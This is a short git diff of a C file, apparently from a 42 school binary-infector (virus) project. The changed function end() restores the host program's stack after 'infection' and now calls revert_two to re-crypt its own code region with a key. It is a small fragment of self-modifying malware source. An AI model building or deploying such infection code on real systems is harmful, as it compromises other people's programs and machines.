@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 19:19:24 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 20:41:30 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/13 14:34:21 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,13 +14,12 @@
 
 /*
   End() redo the stack used during infection.
-  it pop all registers so that original binary can get back register
-  the way it should normally be.
+  it pop all registers and replace current stack ptr by original one
+  the way it should normally be without any infection.
 */
 void	end(t_data *data)
 {
-	/* if (data->context == true) */
-	/* 	revert_one(&data->key, (char*)release, (size_t)end - (size_t)release); */
+	revert_two(&data->key, (char*)erase, (size_t)end - (size_t)erase);
 
 #ifdef DEBUG
 	char log[] = "end\t\t";
